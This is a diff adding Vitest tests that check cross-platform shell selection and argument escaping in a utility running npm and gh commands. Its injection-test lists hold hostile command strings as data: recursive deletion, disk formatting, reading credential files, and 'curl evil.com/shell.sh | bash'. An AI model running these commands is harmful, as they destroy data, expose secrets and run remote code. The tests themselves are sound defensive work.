@@ -4,6 +4,7 @@ import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
 const mockExec = vi.hoisted(() => vi.fn());
 const mockGenerateCacheKey = vi.hoisted(() => vi.fn());
 const mockWithCache = vi.hoisted(() => vi.fn());
+const mockPlatform = vi.hoisted(() => vi.fn());
 
 // Mock child_process
 vi.mock('child_process', () => ({
@@ -25,6 +26,11 @@ vi.mock('util', () => ({
       });
     };
   }),
+}));
+
+// Mock os module for cross-platform testing
+vi.mock('os', () => ({
+  platform: mockPlatform,
 }));
 
 // Mock cache utilities
@@ -268,6 +274,7 @@ describe('Exec Utilities', () => {
         expect(mockGenerateCacheKey).toHaveBeenCalledWith('npm-exec', {
           command: 'view',
           args: ['test'],
+          shell: 'unix',
         });
         expect(mockWithCache).toHaveBeenCalledWith(
           'test-cache-key',
@@ -478,6 +485,7 @@ describe('Exec Utilities', () => {
         expect(mockGenerateCacheKey).toHaveBeenCalledWith('gh-exec', {
           command: 'search',
           args: ['repos', 'test'],
+          shell: 'unix',
         });
         expect(mockWithCache).toHaveBeenCalledWith(
           'test-cache-key',
@@ -1086,6 +1094,461 @@ describe('Exec Utilities', () => {
         }),
         expect.any(Function)
       );
+    });
+  });
+
+  describe('Cross-Platform Compatibility', () => {
+    beforeEach(() => {
+      // Clear all mocks before each test
+      vi.clearAllMocks();
+
+      // Default implementation for withCache - just execute the function
+      mockWithCache.mockImplementation(
+        async (key: string, fn: () => Promise<CallToolResult>) => fn()
+      );
+
+      // Default cache key generation
+      mockGenerateCacheKey.mockReturnValue('test-cache-key');
+    });
+
+    describe('Windows Platform Behavior', () => {
+      beforeEach(() => {
+        // Mock platform to return 'win32' for Windows tests
+        mockPlatform.mockReturnValue('win32');
+      });
+
+      it('should use cmd.exe shell on Windows by default', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'success', stderr: '' });
+        });
+
+        const result = await executeNpmCommand('view', ['test']);
+
+        expect(result.isError).toBe(false);
+        expect(mockExec).toHaveBeenCalledWith(
+          expect.any(String),
+          expect.objectContaining({
+            shell: 'cmd.exe',
+            env: expect.objectContaining({
+              SHELL: 'cmd.exe',
+            }),
+          }),
+          expect.any(Function)
+        );
+
+        const data = JSON.parse(result.content[0].text as string);
+        expect(data.platform).toBe('win32');
+        expect(data.shell).toBe('cmd.exe');
+        expect(data.shellType).toBe('cmd');
+      });
+
+      it('should use Windows-style argument escaping for cmd.exe', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'success', stderr: '' });
+        });
+
+        // Test Windows CMD special characters that need escaping
+        const windowsSpecialArgs = [
+          'test package', // Space - should be quoted
+          'test&malicious', // & - should be quoted
+          'test<input', // < - should be quoted
+          'test>output', // > - should be quoted
+          'test|pipe', // | - should be quoted
+          'test^caret', // ^ - should be quoted
+          'test"quote', // " - should be quoted and escaped
+          'safe-arg', // Safe arg - should not be quoted
+          'safe.arg', // Safe arg - should not be quoted
+          'safe_arg', // Safe arg - should not be quoted
+        ];
+
+        const result = await executeNpmCommand('view', windowsSpecialArgs);
+
+        expect(result.isError).toBe(false);
+        // Verify Windows-style double quote escaping
+        expect(mockExec).toHaveBeenCalledWith(
+          'npm view "test package" "test&malicious" "test<input" "test>output" "test|pipe" "test^caret" "test""quote" safe-arg safe.arg safe_arg',
+          expect.any(Object),
+          expect.any(Function)
+        );
+      });
+    });
+
+    describe('PowerShell Support', () => {
+      beforeEach(() => {
+        // Mock platform to return 'win32' for Windows tests
+        mockPlatform.mockReturnValue('win32');
+      });
+
+      it('should use PowerShell when explicitly specified', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'success', stderr: '' });
+        });
+
+        const result = await executeNpmCommand('view', ['test'], {
+          windowsShell: 'powershell',
+        });
+
+        expect(result.isError).toBe(false);
+        expect(mockExec).toHaveBeenCalledWith(
+          expect.any(String),
+          expect.objectContaining({
+            shell: 'powershell.exe',
+            env: expect.objectContaining({
+              SHELL: 'powershell.exe',
+            }),
+          }),
+          expect.any(Function)
+        );
+
+        const data = JSON.parse(result.content[0].text as string);
+        expect(data.platform).toBe('win32');
+        expect(data.shell).toBe('powershell.exe');
+        expect(data.shellType).toBe('powershell');
+      });
+
+      it('should use PowerShell-style argument escaping', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'success', stderr: '' });
+        });
+
+        // Test PowerShell special characters that need escaping
+        const powershellSpecialArgs = [
+          'test package', // Space - should be quoted
+          'test&malicious', // & - should be quoted
+          'test<input', // < - should be quoted
+          'test>output', // > - should be quoted
+          'test|pipe', // | - should be quoted
+          'test;separator', // ; - should be quoted
+          'test`backtick', // ` - should be quoted
+          'test$variable', // $ - should be quoted
+          'test@symbol', // @ - should be quoted
+          'test"quote', // " - should be quoted
+          "test'single", // ' - should be quoted and escaped
+          'test(paren)', // () - should be quoted
+          'test[bracket]', // [] - should be quoted
+          'test{brace}', // {} - should be quoted
+          'safe-arg', // Safe arg - should not be quoted
+          'safe.arg', // Safe arg - should not be quoted
+          'safe_arg', // Safe arg - should not be quoted
+        ];
+
+        const result = await executeNpmCommand('view', powershellSpecialArgs, {
+          windowsShell: 'powershell',
+        });
+
+        expect(result.isError).toBe(false);
+        // Verify PowerShell-style single quote escaping
+        expect(mockExec).toHaveBeenCalledWith(
+          "npm view 'test package' 'test&malicious' 'test<input' 'test>output' 'test|pipe' 'test;separator' 'test`backtick' 'test$variable' 'test@symbol' 'test\"quote' 'test''single' 'test(paren)' 'test[bracket]' 'test{brace}' safe-arg safe.arg safe_arg",
+          expect.any(Object),
+          expect.any(Function)
+        );
+      });
+
+      it('should handle PowerShell injection attempts safely', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'safe execution', stderr: '' });
+        });
+
+        const powershellInjectionAttempts = [
+          'test; Remove-Item -Path C:\\ -Recurse', // Command separator
+          'test & Remove-Item C:\\*', // Background execution
+          'test | Get-Content C:\\Windows\\System32\\config\\sam', // Pipe
+          'test > C:\\malicious.ps1', // Redirect
+          'test < C:\\Windows\\System32\\drivers\\etc\\hosts', // Input redirect
+          'test $(Remove-Item C:\\)', // Command substitution
+          'test `Remove-Item C:\\`', // Backtick substitution
+          'test $env:TEMP\\malicious', // Environment variable
+          'test @("evil", "command")', // Array syntax
+          'test {Remove-Item C:\\}', // Script block
+          'test (Get-Process)', // Expression
+          'test [System.IO.File]::Delete("C:\\")', // .NET method call
+        ];
+
+        const result = await executeNpmCommand(
+          'view',
+          powershellInjectionAttempts,
+          {
+            windowsShell: 'powershell',
+          }
+        );
+
+        expect(result.isError).toBe(false);
+        // Verify all dangerous patterns are quoted in the command string
+        const actualCommand = mockExec.mock.calls[0][0];
+        expect(actualCommand).toContain("'test; Remove-Item -Path C:\\ -Recurse'");
+        expect(actualCommand).toContain("'test & Remove-Item C:\\*'");
+        expect(actualCommand).toContain("'test | Get-Content C:\\Windows\\System32\\config\\sam'");
+        expect(actualCommand).toContain("'test > C:\\malicious.ps1'");
+        expect(actualCommand).toContain("'test $(Remove-Item C:\\)'");
+        expect(actualCommand).toContain("'test `Remove-Item C:\\`'");
+        expect(actualCommand).toContain("'test $env:TEMP\\malicious'");
+        expect(actualCommand).toContain("'test @(\"evil\", \"command\")'");
+        expect(actualCommand).toContain("'test {Remove-Item C:\\}'");
+        expect(actualCommand).toContain("'test (Get-Process)'");
+        expect(actualCommand).toContain("'test [System.IO.File]::Delete(\"C:\\\")'");
+      });
+
+      it('should work with GitHub CLI commands in PowerShell', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: '[]', stderr: '' });
+        });
+
+        const result = await executeGitHubCommand('search', ['repos', 'test'], {
+          windowsShell: 'powershell',
+        });
+
+        expect(result.isError).toBe(false);
+        expect(mockExec).toHaveBeenCalledWith(
+          'gh search repos test',
+          expect.objectContaining({
+            shell: 'powershell.exe',
+            env: expect.objectContaining({
+              SHELL: 'powershell.exe',
+            }),
+          }),
+          expect.any(Function)
+        );
+
+        const data = JSON.parse(result.content[0].text as string);
+        expect(data.shellType).toBe('powershell');
+      });
+
+      it('should include shell type in cache key for PowerShell', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'cached result', stderr: '' });
+        });
+
+        await executeNpmCommand('view', ['test'], {
+          cache: true,
+          windowsShell: 'powershell',
+        });
+
+        expect(mockGenerateCacheKey).toHaveBeenCalledWith('npm-exec', {
+          command: 'view',
+          args: ['test'],
+          shell: 'powershell',
+        });
+      });
+    });
+
+    describe('Unix/Linux/macOS Platform Behavior', () => {
+      beforeEach(() => {
+        // Mock platform to return non-Windows values
+        mockPlatform.mockReturnValue('darwin'); // macOS
+      });
+
+      it('should use /bin/sh shell on Unix systems', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'success', stderr: '' });
+        });
+
+        const result = await executeNpmCommand('view', ['test']);
+
+        expect(result.isError).toBe(false);
+        expect(mockExec).toHaveBeenCalledWith(
+          expect.any(String),
+          expect.objectContaining({
+            shell: '/bin/sh',
+            env: expect.objectContaining({
+              SHELL: '/bin/sh',
+            }),
+          }),
+          expect.any(Function)
+        );
+
+        const data = JSON.parse(result.content[0].text as string);
+        expect(data.platform).toBe('darwin');
+        expect(data.shell).toBe('/bin/sh');
+        expect(data.shellType).toBe('unix');
+      });
+
+      it('should ignore windowsShell option on Unix systems', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'success', stderr: '' });
+        });
+
+        const result = await executeNpmCommand('view', ['test'], {
+          windowsShell: 'powershell', // Should be ignored on Unix
+        });
+
+        expect(result.isError).toBe(false);
+        expect(mockExec).toHaveBeenCalledWith(
+          expect.any(String),
+          expect.objectContaining({
+            shell: '/bin/sh', // Should still use /bin/sh
+          }),
+          expect.any(Function)
+        );
+
+        const data = JSON.parse(result.content[0].text as string);
+        expect(data.shellType).toBe('unix');
+      });
+
+      it('should use Unix-style argument escaping', async () => {
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'success', stderr: '' });
+        });
+
+        // Test Unix shell special characters that need escaping
+        const unixSpecialArgs = [
+          'test package', // Space - should be quoted
+          'test;malicious', // ; - should be quoted
+          'test&background', // & - should be quoted
+          'test|pipe', // | - should be quoted
+          'test>redirect', // > - should be quoted
+          'test<input', // < - should be quoted
+          'test$(command)', // $() - should be quoted
+          'test`command`', // `` - should be quoted
+          'test*glob', // * - should be quoted
+          'test?wildcard', // ? - should be quoted
+          'test[range]', // [] - should be quoted
+          'test{brace}', // {} - should be quoted
+          "test'quote", // ' - should be quoted and escaped
+          'safe-arg', // Safe arg - should not be quoted
+          'safe.arg', // Safe arg - should not be quoted
+          'safe_arg', // Safe arg - should not be quoted
+          'safe/path', // Safe path - should not be quoted
+          'safe:value', // Safe colon - should not be quoted
+          'safe=value', // Safe equals - should not be quoted
+          '@scope/package', // Safe @ - should not be quoted
+        ];
+
+        const result = await executeNpmCommand('view', unixSpecialArgs);
+
+        expect(result.isError).toBe(false);
+        // Verify Unix-style single quote escaping
+        expect(mockExec).toHaveBeenCalledWith(
+          "npm view 'test package' 'test;malicious' 'test&background' 'test|pipe' 'test>redirect' 'test<input' 'test$(command)' 'test`command`' 'test*glob' 'test?wildcard' 'test[range]' 'test{brace}' 'test'\"'\"'quote' safe-arg safe.arg safe_arg safe/path safe:value safe=value @scope/package",
+          expect.any(Object),
+          expect.any(Function)
+        );
+      });
+    });
+
+    describe('Cross-Platform Security Validation', () => {
+      it('should prevent injection attempts on Windows CMD', async () => {
+        mockPlatform.mockReturnValue('win32');
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'safe execution', stderr: '' });
+        });
+
+        const windowsInjectionAttempts = [
+          'test & del /f /q C:\\*', // Command chaining
+          'test && rmdir /s /q C:\\', // Logical AND
+          'test || format C:', // Logical OR
+          'test | type C:\\Windows\\System32\\config\\sam', // Pipe
+          'test > C:\\malicious.bat', // Redirect
+          'test < C:\\Windows\\System32\\drivers\\etc\\hosts', // Input redirect
+          'test^&^echo^malicious', // Escaped characters
+        ];
+
+        const result = await executeNpmCommand(
+          'view',
+          windowsInjectionAttempts
+        );
+
+        expect(result.isError).toBe(false);
+        // Verify all dangerous characters are properly quoted
+        expect(mockExec).toHaveBeenCalledWith(
+          expect.stringContaining('"test & del /f /q C:\\*"'),
+          expect.any(Object),
+          expect.any(Function)
+        );
+      });
+
+      it('should prevent injection attempts on Unix', async () => {
+        mockPlatform.mockReturnValue('linux');
+        mockExec.mockImplementation((cmd, opts, callback) => {
+          callback(null, { stdout: 'safe execution', stderr: '' });
+        });
+
+        const unixInjectionAttempts = [
+          'test; rm -rf /', // Command separator
+          'test && rm -rf /usr', // Logical AND
+          'test || rm -rf /etc', // Logical OR
+          'test | cat /etc/passwd', // Pipe
+          'test > /etc/shadow', // Redirect
+          'test < /etc/passwd', // Input redirect
+          'test $(rm -rf /)', // Command substitution
+          'test `rm -rf /`', // Backtick substitution
+          'test & curl evil.com/shell.sh | bash', // Background + pipe
+          'test *', // Glob expansion
+          'test {a,b,c}', // Brace expansion
+          'test [a-z]*', // Character range
+        ];
+
+        const result = await executeNpmCommand('view', unixInjectionAttempts);
+
+        expect(result.isError).toBe(false);
+        // Verify all dangerous patterns are quoted
+        expect(mockExec).toHaveBeenCalledWith(
+          expect.stringContaining("'test; rm -rf /'"),
+          expect.any(Object),
+          expect.any(Function)
+        );
+      });
+    });
+
+    describe('Shell Type Detection and Behavior', () => {
+      it('should correctly detect shell type across platforms', async () => {
+        const testCases = [
+          {
+            platform: 'win32',
+            windowsShell: undefined,
+            expectedShell: 'cmd.exe',
+            expectedType: 'cmd',
+          },
+          {
+            platform: 'win32',
+            windowsShell: 'cmd' as const,
+            expectedShell: 'cmd.exe',
+            expectedType: 'cmd',
+          },
+          {
+            platform: 'win32',
+            windowsShell: 'powershell' as const,
+            expectedShell: 'powershell.exe',
+            expectedType: 'powershell',
+          },
+          {
+            platform: 'darwin',
+            windowsShell: undefined,
+            expectedShell: '/bin/sh',
+            expectedType: 'unix',
+          },
+          {
+            platform: 'linux',
+            windowsShell: 'powershell' as const, // Should be ignored
+            expectedShell: '/bin/sh',
+            expectedType: 'unix',
+          },
+        ];
+
+        for (const testCase of testCases) {
+          mockPlatform.mockReturnValue(testCase.platform);
+          mockExec.mockImplementation((cmd, opts, callback) => {
+            callback(null, { stdout: 'success', stderr: '' });
+          });
+
+          const result = await executeNpmCommand('view', ['test'], {
+            windowsShell: testCase.windowsShell,
+          });
+
+          expect(result.isError).toBe(false);
+          expect(mockExec).toHaveBeenCalledWith(
+            expect.any(String),
+            expect.objectContaining({
+              shell: testCase.expectedShell,
+            }),
+            expect.any(Function)
+          );
+
+          const data = JSON.parse(result.content[0].text as string);
+          expect(data.shell).toBe(testCase.expectedShell);
+          expect(data.shellType).toBe(testCase.expectedType);
+        }
+      });
     });
   });
 });
